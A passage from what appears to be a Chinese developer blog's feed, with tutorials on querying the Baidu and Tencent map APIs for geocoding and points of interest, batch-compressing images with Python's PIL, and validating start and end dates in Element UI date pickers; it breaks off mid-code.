data-src="https://img-blog.csdnimg.cn/2020061615172698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg5Mzk1,size_16,color_FFFFFF,t_70" alt="高德爬取"></p><h2 id="二、百度地图"><a href="#二、百度地图" class="headerlink" title="二、百度地图"></a>二、百度地图</h2><h3 id="地理编码-1"><a href="#地理编码-1" class="headerlink" title="地理编码"></a>地理编码</h3><p><img data-src="https://img-blog.csdnimg.cn/20191018183153897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg5Mzk1,size_16,color_FFFFFF,t_70" alt="baidu"></p><p>操作步骤：</p><ol><li>申请 <strong>Web 服务API 密钥（ak）</strong><br><a href="https://lbsyun.baidu.com/apiconsole/key/create">申请密钥链接</a></li></ol><p><strong>Referer 白名单：</strong>  *<br>Referer 白名单：后面填写 * 否则会出现 <strong>message：APP Referer校验失败</strong><br>2. 拼接 HTTP 请求 URL<br>这里选用的是【地理编码】<br><strong>修改 address 和 key</strong></p><ul><li>address=&lt;搜索的地址&gt;</li><li>key=&lt;用户的key&gt;<br><code>http://api.map.baidu.com/geocoding/v3/?address=&lt;搜索的地址&gt;&amp;output=xml&amp;ak=&lt;用户的key&gt;</code></li></ul><ol start="3"><li>接收 HTTP 请求返回的数据（JSON 或 XML 格式），解析数据。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">base_url = <span class="string">&#x27;http://api.map.baidu.com/geocoding/v3/?address=&#x27;</span></span><br><span class="line"><span class="comment">#填写ak</span></span><br><span class="line">fun_url = <span class="string">&#x27;&amp;output=xml&amp;ak=您的ak&#x27;</span></span><br><span class="line">address = <span class="string">&#x27;北京大学&#x27;</span></span><br><span class="line">url = base_url + address + fun_url</span><br><span class="line">response = requests.get(url)</span><br><span class="line">soup = BeautifulSoup(response.text,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">location_lng = <span class="built_in">str</span>(soup.find(<span class="string">&#x27;lng&#x27;</span>))</span><br><span class="line">location_down_lng = re.split(<span class="string">&#x27;&lt;|&gt;&#x27;</span>,location_lng)</span><br><span class="line">longitude = location_down_lng[<span class="number">2</span>]</span><br><span class="line">location_lat = <span class="built_in">str</span>(soup.find(<span class="string">&#x27;lat&#x27;</span>))</span><br><span class="line">location_down_lat = re.split(<span class="string">&#x27;&lt;|&gt;&#x27;</span>,location_lat)</span><br><span class="line">latitude = location_down_lat[<span class="number">2</span>]</span><br><span class="line">print(<span class="string">&#x27;经度为：&#123;&#125; 纬度为：&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(longitude,latitude))</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>经度为：<span class="number">116.304152442</span> 纬度为：<span class="number">39.9670892266</span></span><br></pre></td></tr></table></figure><h3 id="搜索POI-1"><a href="#搜索POI-1" class="headerlink" title="搜索POI"></a>搜索POI</h3><p>百度可能出现的问题（请求人数过多报错）：<code>&#123;&#39;status&#39;: 401, &#39;message&#39;: &#39;当前并发量已经超过约定并发配额，限制访问&#39;&#125;</code> 加一个<code>try:except:</code><br><img data-src="https://img-blog.csdnimg.cn/20200526165701771.png" alt="接口_百度"><br>详细参数参考链接：<a href="http://lbsyun.baidu.com/index.php?title=webapi/guide/webservice-placeapi#service-page-anchor-1-3">http://lbsyun.baidu.com/index.php?title=webapi/guide/webservice-placeapi#service-page-anchor-1-3</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&#x27;http://api.map.baidu.com/place/v2/search?&#x27;</span></span><br><span class="line">page_num = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  data = &#123;<span class="string">&#x27;ak&#x27;</span>: <span class="string">&#x27;您的ak&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;query&#x27;</span>: <span class="string">&#x27;海底捞&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;region&#x27;</span>: <span class="string">&#x27;南京&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;output&#x27;</span>: <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;page_num&#x27;</span>: page_num&#125;</span><br><span class="line">  html = requests.get(url,params=data,headers=headers)</span><br><span class="line">  j = html.json()</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(j[<span class="string">&#x27;results&#x27;</span>])):</span><br><span class="line">      data1 = [(j[<span class="string">&#x27;results&#x27;</span>][i][<span class="string">&#x27;name&#x27;</span>],</span><br><span class="line">              j[<span class="string">&#x27;results&#x27;</span>][i][<span class="string">&#x27;address&#x27;</span>],</span><br><span class="line">              j[<span class="string">&#x27;results&#x27;</span>][i][<span class="string">&#x27;province&#x27;</span>],</span><br><span class="line">              j[<span class="string">&#x27;results&#x27;</span>][i][<span class="string">&#x27;city&#x27;</span>],</span><br><span class="line">              j[<span class="string">&#x27;results&#x27;</span>][i][<span class="string">&#x27;area&#x27;</span>],</span><br><span class="line">              j[<span class="string">&#x27;results&#x27;</span>][i][<span class="string">&#x27;telephone&#x27;</span>],</span><br><span class="line">              <span class="built_in">str</span>(j[<span class="string">&#x27;results&#x27;</span>][i][<span class="string">&#x27;location&#x27;</span>][<span class="string">&#x27;lat&#x27;</span>])+<span class="string">&#x27;,&#x27;</span>+<span class="built_in">str</span>(j[<span class="string">&#x27;results&#x27;</span>][i][<span class="string">&#x27;location&#x27;</span>][<span class="string">&#x27;lng&#x27;</span>]))]</span><br><span class="line">      data2 = pd.DataFrame(data1)</span><br><span class="line">      data2.to_csv(<span class="string">&#x27;map_baidu.csv&#x27;</span>,header=<span class="literal">False</span>,index=<span class="literal">False</span>,mode=<span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line">  <span class="keyword">except</span> KeyError:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">str</span>(page_num)+<span class="string">&#x27;has done&#x27;</span>)</span><br><span class="line">page_num += <span class="number">1</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>爬取效果如下：</p><p><img data-src="https://img-blog.csdnimg.cn/20200616151556844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg5Mzk1,size_16,color_FFFFFF,t_70" alt="百度爬取"></p><h2 id="三、腾讯地图"><a href="#三、腾讯地图" class="headerlink" title="三、腾讯地图"></a>三、腾讯地图</h2><h3 id="地理编码-2"><a href="#地理编码-2" class="headerlink" title="地理编码"></a>地理编码</h3><p><img data-src="https://img-blog.csdnimg.cn/20191018185450427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg5Mzk1,size_16,color_FFFFFF,t_70" alt="tengxun"></p><p>操作步骤：</p><ol><li>申请 <strong>Web 服务 API 密钥（key）</strong><br><a href="https://lbs.qq.com/dev/console/key/add">申请密钥链接</a></li><li>拼接 HTTP 请求 URL<br>这里选用的是【地理编码】</li></ol><p><strong>修改 address 和 key</strong></p><ul><li>address=&lt;搜索的地址&gt;</li><li>key=&lt;用户的key&gt;<br><code>https://apis.map.qq.com/ws/geocoder/v1/?address=&lt;搜索的地址&gt;&amp;key=&lt;用户的key&gt;</code></li></ul><ol start="3"><li>接收 HTTP 请求返回的数据（JSON 或 XML 格式），解析数据。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">base_url = <span class="string">&#x27;https://apis.map.qq.com/ws/geocoder/v1/?address=&#x27;</span></span><br><span class="line">fun_url = <span class="string">&#x27;&amp;output=xml&amp;key=您的key&#x27;</span></span><br><span class="line">address = <span class="string">&#x27;北京大学&#x27;</span></span><br><span class="line">url = base_url + address + fun_url</span><br><span class="line">response = requests.get(url)</span><br><span class="line">location_text = response.text</span><br><span class="line">longitude = re.findall(<span class="string">&quot;lng\&quot;: (.*?),&quot;</span>,location_text)[<span class="number">0</span>]</span><br><span class="line">latitude = re.findall(<span class="string">&quot;lat\&quot;: (.*?)\n&quot;</span>,location_text)[<span class="number">0</span>]</span><br><span class="line">print(<span class="string">&#x27;经度为：&#123;&#125; 纬度为：&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(longitude),<span class="built_in">str</span>(latitude)))</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>经度为：<span class="number">116.310249</span> 纬度为：<span class="number">39.99287</span></span><br></pre></td></tr></table></figure><h3 id="搜索POI-2"><a href="#搜索POI-2" class="headerlink" title="搜索POI"></a>搜索POI</h3><p>详细参数参考链接：<a href="https://lbs.qq.com/service/webService/webServiceGuide/webServiceSearch">https://lbs.qq.com/service/webService/webServiceGuide/webServiceSearch</a></p><p>这部分就不进行爬取了…</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;看了 B站up主 应心小栈 的视频有感 &lt;a href=&quot;https://space.bilibili.com/95113417/&quot;&gt;应心小栈&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Python" scheme="http://llmysnow.top/categories/Python/"/>
    
    
    <category term="Python" scheme="http://llmysnow.top/tags/Python/"/>
    
    <category term="批处理" scheme="http://llmysnow.top/tags/%E6%89%B9%E5%A4%84%E7%90%86/"/>
    
    <category term="爬取地图" scheme="http://llmysnow.top/tags/%E7%88%AC%E5%8F%96%E5%9C%B0%E5%9B%BE/"/>
    
  </entry>
  
  <entry>
    <title>Python 批量压缩图片（维持原目录结构）</title>
    <link href="http://llmysnow.top/posts/258a330/"/>
    <id>http://llmysnow.top/posts/258a330/</id>
    <published>2021-06-10T06:24:59.308Z</published>
    <updated>2021-06-10T07:51:59.104Z</updated>
    
    <content type="html"><![CDATA[<h2 id="需求："><a href="#需求：" class="headerlink" title="需求："></a>需求：</h2><p>最近在做图像识别的时候，遇到了一个问题，图片很多并且图像比较大，没有办法上传到服务器，于是想到了用 python 批量压缩。</p><p>用到 PIL 库，PIL 是 Python 平台事实上的图像处理标准库，支持多种格式，并提供强大的图形与图像处理功能。使用如下命令安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pillow</span><br></pre></td></tr></table></figure><a id="more"></a><p>效果图如下：<br><img data-src="https://img-blog.csdnimg.cn/20210608182907195.gif" alt="维持原目录结构"></p><h2 id="代码如下："><a href="#代码如下：" class="headerlink" title="代码如下："></a>代码如下：</h2><p>注意：</p><ol><li>如果你的图片有其他图片后缀名（比如：bmp）直接在 suffix 数组中添加即可</li><li>控制 <code>save(dstFile, quality=80, subsampling=0)</code> 中的 quality 即可控制图片大小</li><li>如果希望控制图片尺寸，修改 <code>resize((int(w), int(h))</code> w 和 h 即可</li><li>替换 srcPath（图片原始路径）和 dstPath （图片生成路径）路径即可使用</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 图片原始存放路径</span></span><br><span class="line">srcPath = <span class="string">r&#x27;E:\图片\convert&#x27;</span></span><br><span class="line"><span class="comment"># 图片最后存放到什么路径</span></span><br><span class="line">dstPath = <span class="string">r&#x27;E:\图片\to&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compressImage</span>(<span class="params">srcPath, dstPath</span>):</span></span><br><span class="line">    suffix = [<span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.jpeg&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> dirpath, dirnames, files <span class="keyword">in</span> os.walk(srcPath):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            file_path = os.path.join(dirpath, file)</span><br><span class="line">            <span class="keyword">for</span> fix <span class="keyword">in</span> suffix:</span><br><span class="line">                <span class="keyword">if</span> file.endswith(fix):</span><br><span class="line">                    srcFile = os.path.join(dirpath, file)</span><br><span class="line">                    floder = dirpath.split(<span class="string">&#x27;\\&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">                    dstFloder = os.path.join(dstPath, floder)</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(dstFloder):</span><br><span class="line">                        os.makedirs(dstFloder)</span><br><span class="line">                    dstFile = os.path.join(dstFloder, file)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        img = Image.<span class="built_in">open</span>(srcFile)</span><br><span class="line">                        w, h = img.size</span><br><span class="line">                        <span class="comment"># 设置压缩尺寸和选项，注意尺寸要用括号！！！</span></span><br><span class="line">                        dImg = img.resize((<span class="built_in">int</span>(w), <span class="built_in">int</span>(h)), Image.ANTIALIAS)</span><br><span class="line">                        <span class="comment"># 压缩图片质量，控制quality的值即可！！！</span></span><br><span class="line">                        dImg.save(dstFile, quality=<span class="number">80</span>, subsampling=<span class="number">0</span>)</span><br><span class="line">                        print(dstFile + <span class="string">&quot; 成功！&quot;</span>)</span><br><span class="line">                    <span class="keyword">except</span> Exception:</span><br><span class="line">                        print(dstFile + <span class="string">&quot;失败！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    compressImage(srcPath, dstPath)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;需求：&quot;&gt;&lt;a href=&quot;#需求：&quot; class=&quot;headerlink&quot; title=&quot;需求：&quot;&gt;&lt;/a&gt;需求：&lt;/h2&gt;&lt;p&gt;最近在做图像识别的时候，遇到了一个问题，图片很多并且图像比较大，没有办法上传到服务器，于是想到了用 python 批量压缩。&lt;/p&gt;
&lt;p&gt;用到 PIL 库，PIL 是 Python 平台事实上的图像处理标准库，支持多种格式，并提供强大的图形与图像处理功能。使用如下命令安装：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pip install pillow&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Python" scheme="http://llmysnow.top/categories/Python/"/>
    
    
    <category term="Python" scheme="http://llmysnow.top/tags/Python/"/>
    
    <category term="批处理" scheme="http://llmysnow.top/tags/%E6%89%B9%E5%A4%84%E7%90%86/"/>
    
    <category term="压缩图片" scheme="http://llmysnow.top/tags/%E5%8E%8B%E7%BC%A9%E5%9B%BE%E7%89%87/"/>
    
  </entry>
  
  <entry>
    <title>Element 可选日期范围限制或检验（开始日期结束日期）</title>
    <link href="http://llmysnow.top/posts/94396d70/"/>
    <id>http://llmysnow.top/posts/94396d70/</id>
    <published>2021-06-10T06:22:57.065Z</published>
    <updated>2021-07-08T01:40:44.352Z</updated>
    
    <content type="html"><![CDATA[<h2 id="需求："><a href="#需求：" class="headerlink" title="需求："></a>需求：</h2><ol start="2"><li>选择起始日期后截止日期不能小于起始日期</li><li>选择截止日期后起始日期不能大于截止日期</li></ol><a id="more"></a><p>有两种实现方法：</p><ol><li><p>选择起始日期，起始日期之前的日期就不让你选择</p><p>效果如下：</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/%E8%B5%B7%E5%A7%8B%E6%97%A5%E6%9C%9F%E6%88%AA%E6%AD%A2%E6%97%A5%E6%9C%9F.gif"></p></li><li><p>选择起始日期，表单校验截止日期不能小于起始日期</p><p>效果如下：</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/js-img/%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81_%E8%B5%B7%E5%A7%8B%E6%97%A5%E6%9C%9F%E5%92%8C%E6%88%AA%E6%AD%A2%E6%97%A5%E6%9C%9F.gif"></p></li></ol><h2 id="第一种情况：不让选"><a href="#第一种情况：不让选" class="headerlink" title="第一种情况：不让选"></a>第一种情况：不让选</h2><ul><li>首先不能使用 Element 中的 DatePicker 选择日期范围</li><li>给 DatePicker 动态配置 pick-options 中的 disableDate 即可对可选日期进行限制</li></ul><p><strong>注意：</strong></p><ol><li>如果加<code> value-format</code> 需要给日期格式中间加 <code>-</code></li><li>需要给 DatePicker  加 <code>type=&quot;date&quot;</code></li><li>截止日期如果不能超过当前日期需要减一天（<code>24 * 3600 * 1000 = 8.64e7 </code>）</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">el-form</span> <span class="attr">ref</span>=<span class="string">&quot;form&quot;</span> <span class="attr">:model</span>=<span class="string">&quot;form&quot;</span> <span class="attr">label-width</span>=<span class="string">&quot;100px&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">&quot;起始日期&quot;</span> <span class="attr">prop</span>=<span class="string">&quot;startDate&quot;</span>&gt;</span></span><br><span class="line">      &lt;el-date-picker</span><br><span class="line">        v-model=&quot;form.startDate&quot;</span><br><span class="line">        value-format=&quot;yyyy-MM-dd&quot;</span><br><span class="line">        clearable</span><br><span class="line">        type=&quot;date&quot;</span><br><span class="line">        placeholder=&quot;请选择起始日期&quot;</span><br><span class="line">        :picker-options=&quot;dateTimeStartFunc&quot;</span><br><span class="line">      /&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">&quot;截止日期&quot;</span> <span class="attr">prop</span>=<span class="string">&quot;stopDate&quot;</span>&gt;</span></span><br><span class="line">      &lt;el-date-picker</span><br><span class="line">        v-model=&quot;form.stopDate&quot;</span><br><span class="line">        value-format=&quot;yyyy-MM-dd&quot;</span><br><span class="line">        clearable</span><br><span class="line">        type=&quot;date&quot;</span><br><span class="line">        placeholder=&quot;请选择截止日期&quot;</span><br><span class="line">        :picker-options=&quot;dateTimeEndFunc&quot;</span><br><span class="line">      /&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">el-form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">  <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line">      form: &#123;</span><br><span class="line"><span class="javascript">        startDate: <span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        stopDate: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line">      &#125;,</span><br><span class="line">      dateTimeStartFunc: &#123;</span><br><span class="line"><span class="javascript">        disabledDate: <span class="function"><span class="params">time</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span> (<span class="built_in">this</span>.form.stopDate) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> time.getTime() &gt; <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="built_in">this</span>.form.stopDate).getTime()</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      dateTimeEndFunc: &#123;</span><br><span class="line"><span class="javascript">        disabledDate: <span class="function"><span class="params">time</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span> (<span class="built_in">this</span>.form.startDate) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> time.getTime() &lt; <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="built_in">this</span>.form.startDate).getTime() - <span class="number">8.64e7</span></span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="第二种情况：表单校验"><a href="#第二种情况：表单校验" class="headerlink" title="第二种情况：表单校验"></a>第二种情况：表单校验</h2><ul><li>使用 DatePicker 的 validateField 来对部分表单字段进行校验，如下需动态校验 startDate 和 stopDate</li></ul><p><strong>注意：</strong></p><ol><li>这里需要结合 watch 来使用，不然会出现<code>截止日期必须大于起始日期</code> 不会随着只改变起始日期的情况下消失</li><li>这里可以把表单校验方法抽出去，以后后续修改</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;el-form ref=<span class="string">&quot;form&quot;</span> :model=<span class="string">&quot;form&quot;</span> label-width=<span class="string">&quot;100px&quot;</span> :rules=<span class="string">&quot;rules&quot;</span>&gt;</span><br><span class="line">    &lt;el-form-item label=<span class="string">&quot;起始日期&quot;</span> prop=<span class="string">&quot;startDate&quot;</span>&gt;</span><br><span class="line">      &lt;el-date-picker</span><br><span class="line">        v-model=<span class="string">&quot;form.startDate&quot;</span></span><br><span class="line">        value-format=<span class="string">&quot;yyyy-MM-dd&quot;</span></span><br><span class="line">        clearable</span><br><span class="line">        type=<span class="string">&quot;date&quot;</span></span><br><span class="line">        placeholder=<span class="string">&quot;请选择起始日期&quot;</span></span><br><span class="line">      /&gt;</span><br><span class="line">    &lt;/el-form-item&gt;</span><br><span class="line">    &lt;el-form-item label=<span class="string">&quot;截止日期&quot;</span> prop=<span class="string">&quot;stopDate&quot;</span>&gt;</span><br><span class="line">      &lt;el-date-picker</span><br><span class="line">        v-model=<span class="string">&quot;form.stopDate&quot;</span></span><br><span class="line">        value-format=<span class="string">&quot;yyyy-MM-dd&quot;</span></span><br><span class="line">        clearable</span><br><span class="line">        type=<span class="string">&quot;date&quot;</span></span><br><span class="line">        placeholder=<span class="string">&quot;请选择截止日期&quot;</span></span><br><span class="line">      /&gt;</span><br><span class="line">    &lt;/el-form-item&gt;</span><br><span class="line">  &lt;/el-form&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> checkEndTime = <span class="function">(<span class="params">rule, value, callback</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.ValidatorEndTime(rule, value, callback, <span class="built_in">this</span>.form.startDate)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      form: 